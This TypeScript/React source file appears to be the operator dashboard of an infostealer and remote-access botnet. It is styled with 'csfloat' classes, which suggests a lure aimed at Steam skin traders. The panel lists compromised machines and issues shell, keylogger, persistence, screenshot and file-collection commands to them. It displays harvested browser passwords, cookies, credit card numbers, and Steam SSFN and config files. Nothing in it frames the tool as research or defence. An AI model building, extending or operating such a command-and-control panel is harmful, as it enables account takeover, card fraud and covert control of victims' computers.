import React, { useState, useEffect } from 'react';
import { motion } from 'framer-motion';
import { useAdminAuth } from '../contexts/AdminAuthContext';
import C2Debug from './C2Debug';

interface Agent {
  id: number;
  agent_id: string;
  hostname: string;
  username: string;
  os_info: string;
  ip_address: string;
  last_seen: string;
  status: 'active' | 'inactive' | 'compromised';
  created_at: string;
}

interface BrowserData {
  browser_name: string;
  credentials: Array<{
    url: string;
    username: string;
    password: string;
  }>;
  cookies: Array<{
    host: string;
    name: string;
    value: string;
  }>;
  credit_cards: Array<{
    name_on_card: string;
    number: string;
    expiry_month: number;
    expiry_year: number;
  }>;
}

interface SteamData {
  config_files: { [key: string]: string };
  ssfn_files: string[];
  profile_html?: string;
  inventory_json?: string;
}

interface Result {
  id: number;
  agent_id: string;
  machine_id: string;
  timestamp: number;
  browser_data: BrowserData[];
  steam_data?: SteamData;
  hostname: string;
  username: string;
  created_at: string;
}

const C2Dashboard: React.FC = () => {
  const [agents, setAgents] = useState<Agent[]>([]);
  const [results, setResults] = useState<Result[]>([]);
  const [selectedAgent, setSelectedAgent] = useState<string>('');
  const [commandType, setCommandType] = useState<'shell' | 'download' | 'upload' | 'screenshot' | 'keylog' | 'persistence' | 'collect_data' | 'collect_files' | 'kill_agent' | 'kill_process'>('shell');
  const [commandData, setCommandData] = useState('');
  const [isLoading, setIsLoading] = useState(true);
  const [activeTab, setActiveTab] = useState<'agents' | 'commands' | 'results' | 'debug'>('agents');
  const [selectedResult, setSelectedResult] = useState<Result | null>(null);
  const [showInactive, setShowInactive] = useState(false);
  const { isAdminAuthenticated } = useAdminAuth();
  const [selectedData, setSelectedData] = useState<{
    type: 'browser' | 'steam';
    data: BrowserData | SteamData;
  } | null>(null);

  useEffect(() => {
    if (isAdminAuthenticated) {
      fetchData();
      const interval = setInterval(fetchData, 5000); // Refresh every 5 seconds
      return () => clearInterval(interval);
    }
  }, [isAdminAuthenticated]);

  const getAuthHeaders = () => {
    const token = localStorage.getItem('admin_token');
    if (!token) {
      // This should not happen if the component is rendered
      // because of the isAdminAuthenticated check
      return {}; 
    }
    return {
      'Content-Type': 'application/json',
      'Authorization': `Bearer ${token}`
    };
  };

  const fetchData = async () => {
    if (!isAdminAuthenticated) return;

    try {
      const headers = getAuthHeaders();
      const [agentsRes, resultsRes] = await Promise.all([
        fetch('/api/admin/c2/agents', { headers }),
        fetch('/api/admin/c2/results', { headers })
      ]);
      
      // Check if responses are OK and contain JSON
      if (agentsRes.ok) {
        const contentType = agentsRes.headers.get('content-type');
        if (contentType && contentType.includes('application/json')) {
          const agentsData = await agentsRes.json();
          setAgents(agentsData);
        } else {
          console.error('Agents endpoint returned non-JSON response:', contentType);
          const text = await agentsRes.text();
          console.error('Response text:', text.substring(0, 200));
        }
      } else {
        console.error('Agents endpoint failed:', agentsRes.status, agentsRes.statusText);
      }
      
      if (resultsRes.ok) {
        const contentType = resultsRes.headers.get('content-type');
        if (contentType && contentType.includes('application/json')) {
          const resultsData = await resultsRes.json();
          setResults(resultsData);
        } else {
          console.error('Results endpoint returned non-JSON response:', contentType);
          const text = await resultsRes.text();
          console.error('Response text:', text.substring(0, 200));
        }
      } else {
        console.error('Results endpoint failed:', resultsRes.status, resultsRes.statusText);
      }
    } catch (error) {
      console.error('Error fetching C2 data:', error);
    } finally {
      setIsLoading(false);
    }
  };

  const sendCommand = async () => {
    if (!selectedAgent || !commandData.trim()) {
      alert('Please select an agent and enter a command');
      return;
    }

    try {
      const response = await fetch('/api/admin/c2/command', {
        method: 'POST',
        headers: getAuthHeaders(),
        body: JSON.stringify({
          agent_id: selectedAgent,
          command_type: commandType,
          command_data: commandData
        })
      });

      if (response.ok) {
        setCommandData('');
        alert('Command sent successfully');
        fetchData();
      } else {
        alert('Failed to send command');
      }
    } catch (error) {
      console.error('Error sending command:', error);
      alert('Error sending command');
    }
  };

  const downloadFile = async (agentId: string, filename: string) => {
    try {
      console.log('Attempting to download:', { agentId, filename });
      const response = await fetch(`/api/admin/c2/download/${encodeURIComponent(agentId)}/${encodeURIComponent(filename)}`, {
        headers: getAuthHeaders()
      });

      console.log('Download response:', {
        status: response.status,
        statusText: response.statusText,
        headers: Object.fromEntries(response.headers.entries())
      });

      if (response.ok) {
        const blob = await response.blob();
        const url = window.URL.createObjectURL(blob);
        const a = document.createElement('a');
        a.href = url;
        a.download = filename;
        document.body.appendChild(a);
        a.click();
        window.URL.revokeObjectURL(url);
        document.body.removeChild(a);
      } else {
        let errorMessage = `Failed to download file: Server returned status ${response.status}`;
        try {
          const errorData = await response.json();
          errorMessage = `Failed to download file: ${errorData.error || response.statusText}`;
          console.error('Download error details:', errorData);
        } catch (parseError) {
          console.error('Could not parse error response:', parseError);
        }
        alert(errorMessage);
      }
    } catch (error) {
      console.error('Error downloading file:', error);
      alert('Error downloading file: ' + (error instanceof Error ? error.message : 'Unknown error'));
    }
  };

  const killAgent = async (agentId: string, killType: 'agent' | 'process') => {
    if (!confirm(`Are you sure you want to kill this ${killType}? This action cannot be undone.`)) {
      return;
    }

    try {
      const response = await fetch(`/api/admin/c2/kill/${encodeURIComponent(agentId)}`, {
        method: 'POST',
        headers: getAuthHeaders(),
        body: JSON.stringify({ killType })
      });

      if (response.ok) {
        const result = await response.json();
        alert(`Kill command sent successfully: ${result.message}`);
        fetchData(); // Refresh data
      } else {
        try {
          const errorData = await response.json();
          alert(`Failed to send kill command: ${errorData.error || response.statusText}`);
        } catch {
          alert(`Failed to send kill command: Server returned status ${response.status}`);
        }
      }
    } catch (error) {
      console.error('Error killing agent:', error);
      alert('Error killing agent');
    }
  };

  const deleteAgent = async (agentId: string) => {
    if (!confirm(`Are you sure you want to permanently delete this agent? This action cannot be undone and will remove all associated data.`)) {
      return;
    }

    try {
      const response = await fetch(`/api/admin/c2/agents/${encodeURIComponent(agentId)}`, {
        method: 'DELETE',
        headers: getAuthHeaders()
      });

      if (response.ok) {
        const result = await response.json();
        alert(`Agent deleted successfully: ${result.message}`);
        fetchData(); // Refresh data
      } else {
        try {
          const errorData = await response.json();
          alert(`Failed to delete agent: ${errorData.error || response.statusText}`);
        } catch {
          alert(`Failed to delete agent: Server returned status ${response.status}`);
        }
      }
    } catch (error) {
      console.error('Error deleting agent:', error);
      alert('Error deleting agent');
    }
  };

  const deleteResult = async (resultId: number) => {
    if (!confirm('Are you sure you want to delete this result? This action cannot be undone.')) {
      return;
    }

    try {
      const response = await fetch(`/api/admin/c2/results/${resultId}`, {
        method: 'DELETE',
        headers: getAuthHeaders()
      });

      if (response.ok) {
        // Remove the result from the local state
        setResults(results.filter(r => r.id !== resultId));
        alert('Result deleted successfully');
      } else {
        const data = await response.json();
        alert(`Failed to delete result: ${data.error || 'Unknown error'}`);
      }
    } catch (error) {
      console.error('Error deleting result:', error);
      alert('Error deleting result');
    }
  };

  const getStatusColor = (status: string) => {
    switch (status) {
      case 'active': return 'text-green-500';
      case 'inactive': return 'text-yellow-500';
      case 'compromised': return 'text-red-500';
      default: return 'text-gray-500';
    }
  };

  const getStatusDotColor = (status: string) => {
    switch (status) {
      case 'active': return 'bg-green-500';
      case 'inactive': return 'bg-yellow-500';
      case 'compromised': return 'bg-red-500';
      default: return 'bg-gray-500';
    }
  };

  const getCommandTypeColor = (type: string) => {
    switch (type) {
      case 'shell': return 'bg-blue-500';
      case 'download': return 'bg-green-500';
      case 'upload': return 'bg-purple-500';
      case 'screenshot': return 'bg-yellow-500';
      case 'keylog': return 'bg-red-500';
      case 'persistence': return 'bg-indigo-500';
      case 'collect_data': return 'bg-teal-500';
      case 'collect_files': return 'bg-orange-500';
      case 'kill_process': return 'bg-red-600';
      case 'kill_agent': return 'bg-red-800';
      default: return 'bg-gray-500';
    }
  };

  const parseResultData = (resultData: string) => {
    try {
      return JSON.parse(resultData);
    } catch {
      return null;
    }
  };

  const isFileResult = (result: Result) => {
    return result.file_path && result.file_path.length > 0;
  };

  const isDataCollection = (result: Result) => {
    const parsed = parseResultData(result.result_data);
    return parsed && parsed.type;
  };

  const filteredAgents = showInactive ? agents : agents.filter(a => a.status === 'active');

  const renderBrowserData = (data: BrowserData) => (
    <div className="space-y-4">
      <h3 className="text-xl font-bold text-white">{data.browser_name}</h3>
      
      {/* Credentials */}
      {data.credentials.length > 0 && (
        <div className="mt-4">
          <h4 className="text-lg font-semibold text-csfloat-light/90 mb-2">Credentials</h4>
          <div className="space-y-2">
            {data.credentials.map((cred, idx) => (
              <div key={idx} className="bg-csfloat-darker p-3 rounded">
                <div className="flex justify-between">
                  <span className="text-csfloat-light/70">URL:</span>
                  <span className="text-white">{cred.url}</span>
                </div>
                <div className="flex justify-between">
                  <span className="text-csfloat-light/70">Username:</span>
                  <span className="text-white">{cred.username}</span>
                </div>
                <div className="flex justify-between">
                  <span className="text-csfloat-light/70">Password:</span>
                  <span className="text-white font-mono">{cred.password}</span>
                </div>
              </div>
            ))}
          </div>
        </div>
      )}

      {/* Cookies */}
      {data.cookies.length > 0 && (
        <div className="mt-4">
          <h4 className="text-lg font-semibold text-csfloat-light/90 mb-2">Cookies</h4>
          <div className="space-y-2">
            {data.cookies.map((cookie, idx) => (
              <div key={idx} className="bg-csfloat-darker p-3 rounded">
                <div className="flex justify-between">
                  <span className="text-csfloat-light/70">Host:</span>
                  <span className="text-white">{cookie.host}</span>
                </div>
                <div className="flex justify-between">
                  <span className="text-csfloat-light/70">Name:</span>
                  <span className="text-white">{cookie.name}</span>
                </div>
                <div className="flex justify-between">
                  <span className="text-csfloat-light/70">Value:</span>
                  <span className="text-white font-mono">{cookie.value}</span>
                </div>
              </div>
            ))}
          </div>
        </div>
      )}

      {/* Credit Cards */}
      {data.credit_cards.length > 0 && (
        <div className="mt-4">
          <h4 className="text-lg font-semibold text-csfloat-light/90 mb-2">Credit Cards</h4>
          <div className="space-y-2">
            {data.credit_cards.map((card, idx) => (
              <div key={idx} className="bg-csfloat-darker p-3 rounded">
                <div className="flex justify-between">
                  <span className="text-csfloat-light/70">Name:</span>
                  <span className="text-white">{card.name_on_card}</span>
                </div>
                <div className="flex justify-between">
                  <span className="text-csfloat-light/70">Number:</span>
                  <span className="text-white font-mono">{card.number}</span>
                </div>
                <div className="flex justify-between">
                  <span className="text-csfloat-light/70">Expiry:</span>
                  <span className="text-white">{card.expiry_month}/{card.expiry_year}</span>
                </div>
              </div>
            ))}
          </div>
        </div>
      )}
    </div>
  );

  const renderSteamData = (data: SteamData) => (
    <div className="space-y-4">
      <h3 className="text-xl font-bold text-white">Steam Data</h3>
      
      {/* Config Files */}
      {Object.keys(data.config_files).length > 0 && (
        <div className="mt-4">
          <h4 className="text-lg font-semibold text-csfloat-light/90 mb-2">Config Files</h4>
          <div className="space-y-2">
            {Object.entries(data.config_files).map(([filename, content]) => (
              <div key={filename} className="bg-csfloat-darker p-3 rounded">
                <div className="flex justify-between mb-2">
                  <span className="text-csfloat-light/70">{filename}</span>
                </div>
                <pre className="text-white font-mono text-sm overflow-x-auto">
                  {content}
                </pre>
              </div>
            ))}
          </div>
        </div>
      )}

      {/* SSFN Files */}
      {data.ssfn_files.length > 0 && (
        <div className="mt-4">
          <h4 className="text-lg font-semibold text-csfloat-light/90 mb-2">SSFN Files</h4>
          <div className="space-y-2">
            {data.ssfn_files.map((content, idx) => (
              <div key={idx} className="bg-csfloat-darker p-3 rounded">
                <pre className="text-white font-mono text-sm overflow-x-auto">
                  {content}
                </pre>
              </div>
            ))}
          </div>
        </div>
      )}

      {/* Profile HTML */}
      {data.profile_html && (
        <div className="mt-4">
          <h4 className="text-lg font-semibold text-csfloat-light/90 mb-2">Steam Profile</h4>
          <div className="bg-csfloat-darker p-3 rounded">
            <pre className="text-white font-mono text-sm overflow-x-auto">
              {data.profile_html}
            </pre>
          </div>
        </div>
      )}

      {/* Inventory JSON */}
      {data.inventory_json && (
        <div className="mt-4">
          <h4 className="text-lg font-semibold text-csfloat-light/90 mb-2">Steam Inventory</h4>
          <div className="bg-csfloat-darker p-3 rounded">
            <pre className="text-white font-mono text-sm overflow-x-auto">
              {data.inventory_json}
            </pre>
          </div>
        </div>
      )}
    </div>
  );

  // Update the Results Tab rendering to handle the new data format
  const renderResultsTab = () => (
    <div className="bg-csfloat-dark/80 backdrop-blur-sm rounded-lg border border-csfloat-gray/20">
      <div className="p-6">
        <h2 className="text-2xl font-bold text-white mb-4">Command Results</h2>
        {isLoading ? (
          <div className="text-center py-8">
            <div className="animate-spin rounded-full h-8 w-8 border-b-2 border-csfloat-blue mx-auto"></div>
          </div>
        ) : results.length > 0 ? (
          <div className="space-y-4">
            {results.map((result) => (
              <motion.div
                key={result.id}
                initial={{ opacity: 0, y: 20 }}
                animate={{ opacity: 1, y: 0 }}
                className="bg-csfloat-dark rounded-lg p-4 shadow-lg relative"
              >
                <div className="flex justify-between items-start mb-2">
                  <div>
                    <span className="text-csfloat-light/70">Machine ID: </span>
                    <span className="text-white font-mono">{result.machine_id}</span>
                  </div>
                  <span className="text-csfloat-light/50 text-sm">
                    {new Date(result.created_at).toLocaleString()}
                  </span>
                </div>

                <div className="mb-2">
                  <span className="text-csfloat-light/70">Hostname: </span>
                  <span className="text-white">{result.hostname}</span>
                </div>

                <div className="mb-4">
                  <span className="text-csfloat-light/70">Username: </span>
                  <span className="text-white">{result.username}</span>
                </div>

                {/* Browser Data */}
                {result.browser_data && result.browser_data.length > 0 && (
                  <div className="mb-4">
                    <button
                      onClick={() => setSelectedData({ type: 'browser', data: result.browser_data[0] })}
                      className="bg-blue-500 hover:bg-blue-600 text-white px-3 py-1 rounded text-sm transition-colors duration-200"
                    >
                      View Browser Data ({result.browser_data.length} browsers)
                    </button>
                  </div>
                )}

                {/* Steam Data */}
                {result.steam_data && (
                  <div className="mb-4">
                    <button
                      onClick={() => setSelectedData({ type: 'steam', data: result.steam_data })}
                      className="bg-purple-500 hover:bg-purple-600 text-white px-3 py-1 rounded text-sm transition-colors duration-200"
                    >
                      View Steam Data
                    </button>
                  </div>
                )}

                <button
                  onClick={() => deleteResult(result.id)}
                  className="absolute top-4 right-4 bg-red-500 hover:bg-red-600 text-white px-3 py-1 rounded text-sm transition-colors duration-200"
                >
                  Delete
                </button>
              </motion.div>
            ))}
          </div>
        ) : (
          <div className="text-center py-8">
            <p className="text-csfloat-light/60">No results available</p>
          </div>
        )}
      </div>
    </div>
  );

  // Don't render if not authenticated
  if (!isAdminAuthenticated) {
    return null;
  }

  return (
    <>
      <div className="min-h-screen bg-gradient-to-b from-csfloat-darker to-black pt-16 pb-12">
        <div className="max-w-7xl mx-auto px-4 sm:px-6 lg:px-8">
          <div className="mb-8">
            <h1 className="text-4xl font-bold text-white mb-2">C2 Command Center</h1>
            <p className="text-csfloat-light/70">Manage agents and execute commands</p>
          </div>

          {/* Stats Cards */}
          <div className="grid grid-cols-1 md:grid-cols-4 gap-6 mb-8">
            <div className="bg-csfloat-dark/80 backdrop-blur-sm rounded-lg p-6 border border-csfloat-gray/20">
              <h3 className="text-csfloat-light/70 text-sm mb-2">Total Agents</h3>
              <p className="text-3xl font-bold text-white">{agents.length}</p>
            </div>
            <div className="bg-csfloat-dark/80 backdrop-blur-sm rounded-lg p-6 border border-csfloat-gray/20">
              <h3 className="text-csfloat-light/70 text-sm mb-2">Active Agents</h3>
              <p className="text-3xl font-bold text-green-500">
                {agents.filter(a => a.status === 'active').length}
              </p>
            </div>
            <div className="bg-csfloat-dark/80 backdrop-blur-sm rounded-lg p-6 border border-csfloat-gray/20">
              <h3 className="text-csfloat-light/70 text-sm mb-2">Total Results</h3>
              <p className="text-3xl font-bold text-blue-500">{results.length}</p>
            </div>
            <div className="bg-csfloat-dark/80 backdrop-blur-sm rounded-lg p-6 border border-csfloat-gray/20">
              <h3 className="text-csfloat-light/70 text-sm mb-2">Success Rate</h3>
              <p className="text-3xl font-bold text-purple-500">
                {results.length > 0 ? Math.round((results.filter(r => r.success).length / results.length) * 100) : 0}%
              </p>
            </div>
          </div>

          {/* Tabs */}
          <div className="flex space-x-1 mb-6">
            {[
              { id: 'agents', label: 'Agents' },
              { id: 'commands', label: 'Commands' },
              { id: 'results', label: 'Results' },
              { id: 'debug', label: 'Debug' }
            ].map((tab) => (
              <button
                key={tab.id}
                onClick={() => setActiveTab(tab.id as 'agents' | 'commands' | 'results' | 'debug')}
                className={`px-6 py-3 rounded-lg font-medium transition-colors ${
                  activeTab === tab.id
                    ? 'bg-csfloat-blue text-white'
                    : 'text-csfloat-light/70 hover:text-white hover:bg-csfloat-gray/20'
                }`}
              >
                {tab.label}
              </button>
            ))}
          </div>

          {/* Agents Tab */}
          {activeTab === 'agents' && (
            <div className="bg-csfloat-dark/80 backdrop-blur-sm rounded-lg border border-csfloat-gray/20">
              <div className="p-6">
                <div className="flex justify-between items-center mb-4">
                  <h2 className="text-2xl font-bold">Agents ({filteredAgents.length})</h2>
                  <label className="flex items-center space-x-2 cursor-pointer">
                    <input 
                      type="checkbox" 
                      className="form-checkbox h-5 w-5 text-blue-600 bg-gray-800 border-gray-600 rounded focus:ring-blue-500"
                      checked={showInactive}
                      onChange={() => setShowInactive(!showInactive)}
                    />
                    <span className="text-gray-300">Show Inactive</span>
                  </label>
                </div>
                <div className="grid grid-cols-1 md:grid-cols-2 lg:grid-cols-3 gap-4">
                  {filteredAgents.map(agent => (
                    <div 
                      key={agent.agent_id} 
                      className={`bg-gray-800 rounded-lg p-4 cursor-pointer transition-all duration-200 ${selectedAgent === agent.agent_id ? 'ring-2 ring-blue-500' : 'hover:bg-gray-700'}`}
                      onClick={() => setSelectedAgent(agent.agent_id)}
                    >
                      <div className="flex justify-between items-start">
                        <div className="flex-grow">
                          <div className="flex items-center mb-2">
                            <div className={`w-3 h-3 rounded-full mr-2 ${getStatusDotColor(agent.status)}`}></div>
                            <p className="font-bold text-lg truncate" title={agent.hostname}>{agent.hostname}</p>
                          </div>
                          <p className="text-sm text-gray-400 truncate" title={agent.agent_id}>{agent.agent_id}</p>
                        </div>
                        <div className="flex-shrink-0">
                           <span className={`px-2 py-1 text-xs font-semibold rounded-full ${getStatusColor(agent.status)} bg-opacity-20`}>
                            {agent.status}
                          </span>
                        </div>
                      </div>
                      <div className="mt-4 space-y-2 text-sm">
                        <div className="flex justify-between">
                          <span className="text-gray-400">Username:</span>
                          <span className="font-mono">{agent.username}</span>
                        </div>
                        <div className="flex justify-between">
                          <span className="text-gray-400">IP Address:</span>
                          <span className="font-mono">{agent.ip_address}</span>
                        </div>
                        <div className="flex justify-between">
                          <span className="text-gray-400">OS:</span>
                          <span className="text-right truncate" title={agent.os_info}>{agent.os_info}</span>
                        </div>
                        <div className="flex justify-between">
                          <span className="text-gray-400">Last Seen:</span>
                          <span>{new Date(agent.last_seen).toLocaleString()}</span>
                        </div>
                      </div>
                      {/* Kill Agent Buttons */}
                      <div className="mt-4 pt-3 border-t border-gray-700">
                        <div className="flex space-x-2 mb-2">
                          <button
                            onClick={(e) => {
                              e.stopPropagation();
                              killAgent(agent.agent_id, 'process');
                            }}
                            className="flex-1 bg-red-600 hover:bg-red-700 text-white px-3 py-1 rounded text-xs font-medium transition-colors"
                            title="Kill the agent process (agent will restart if persistence is enabled)"
                          >
                            Kill Process
                          </button>
                          <button
                            onClick={(e) => {
                              e.stopPropagation();
                              killAgent(agent.agent_id, 'agent');
                            }}
                            className="flex-1 bg-red-800 hover:bg-red-900 text-white px-3 py-1 rounded text-xs font-medium transition-colors"
                            title="Terminate the agent completely (marks as compromised)"
                          >
                            Kill Agent
                          </button>
                        </div>
                        <div className="flex">
                          <button
                            onClick={(e) => {
                              e.stopPropagation();
                              deleteAgent(agent.agent_id);
                            }}
                            className="w-full bg-gray-800 hover:bg-gray-700 text-red-400 hover:text-red-300 px-3 py-1 rounded text-xs font-medium transition-colors border border-gray-600 hover:border-gray-500"
                            title="Permanently delete this agent and all associated data"
                          >
                            🗑️ Delete Agent
                          </button>
                        </div>
                      </div>
                    </div>
                  ))}
                </div>
              </div>
            </div>
          )}

          {/* Commands Tab */}
          {activeTab === 'commands' && (
            <div className="bg-csfloat-dark/80 backdrop-blur-sm rounded-lg border border-csfloat-gray/20">
              <div className="p-6">
                <h2 className="text-2xl font-bold text-white mb-4">Send Command</h2>
                <div className="grid grid-cols-1 md:grid-cols-2 gap-6 mb-6">
                  <div>
                    <label className="block text-sm font-medium text-csfloat-light/70 mb-2">
                      Select Agent
                    </label>
                    <select
                      value={selectedAgent}
                      onChange={(e) => setSelectedAgent(e.target.value)}
                      className="w-full bg-csfloat-darker border border-csfloat-gray/20 rounded-lg px-4 py-2 text-white focus:outline-none focus:border-csfloat-blue"
                    >
                      <option value="">Choose an agent...</option>
                      {agents.map((agent) => (
                        <option key={agent.id} value={agent.agent_id}>
                          {agent.hostname} ({agent.agent_id})
                        </option>
                      ))}
                    </select>
                  </div>
                  <div>
                    <label className="block text-sm font-medium text-csfloat-light/70 mb-2">
                      Command Type
                    </label>
                    <select
                      value={commandType}
                      onChange={(e) => setCommandType(e.target.value as any)}
                      className="w-full bg-csfloat-darker border border-csfloat-gray/20 rounded-lg px-4 py-2 text-white focus:outline-none focus:border-csfloat-blue"
                    >
                      <option value="shell">Shell Command</option>
                      <option value="download">Download File</option>
                      <option value="upload">Upload File</option>
                      <option value="screenshot">Screenshot</option>
                      <option value="keylog">Keylogger</option>
                      <option value="persistence">Persistence</option>
                      <option value="collect_data">Collect Data</option>
                      <option value="collect_files">Collect Files</option>
                      <option value="kill_process">Kill Process</option>
                      <option value="kill_agent">Kill Agent</option>
                    </select>
                  </div>
                </div>
                <div className="mb-6">
                  <label className="block text-sm font-medium text-csfloat-light/70 mb-2">
                    Command Data
                  </label>
                  <textarea
                    value={commandData}
                    onChange={(e) => setCommandData(e.target.value)}
                    placeholder="Enter command or file path..."
                    className="w-full bg-csfloat-darker border border-csfloat-gray/20 rounded-lg px-4 py-2 text-white focus:outline-none focus:border-csfloat-blue h-32 resize-none"
                  />
                </div>
                <button
                  onClick={sendCommand}
                  disabled={!selectedAgent || !commandData.trim()}
                  className="bg-csfloat-blue hover:bg-blue-600 disabled:bg-csfloat-gray/50 text-white px-6 py-2 rounded-lg transition-colors duration-200 disabled:cursor-not-allowed"
                >
                  Send Command
                </button>
              </div>
            </div>
          )}

          {/* Results Tab */}
          {activeTab === 'results' && renderResultsTab()}

          {/* Debug Tab */}
          {activeTab === 'debug' && (
            <C2Debug />
          )}
        </div>
      </div>

      {/* Data Viewer Modal */}
      {selectedData && (
        <div className="fixed inset-0 bg-black/50 flex items-center justify-center z-50">
          <div className="bg-csfloat-dark rounded-lg p-6 max-w-4xl w-full mx-4 max-h-[80vh] overflow-y-auto">
            <div className="flex justify-between items-center mb-4">
              <h3 className="text-xl font-bold text-white">
                {selectedData.type === 'browser' ? 'Browser Data' : 'Steam Data'}
              </h3>
              <button
                onClick={() => setSelectedData(null)}
                className="text-csfloat-light/60 hover:text-white"
              >
                ✕
              </button>
            </div>
            <div className="bg-csfloat-darker rounded p-4 border border-csfloat-gray/10">
              {selectedData.type === 'browser' 
                ? renderBrowserData(selectedData.data as BrowserData)
                : renderSteamData(selectedData.data as SteamData)
              }
            </div>
          </div>
        </div>
      )}
    </>
  );
};

export default C2Dashboard; 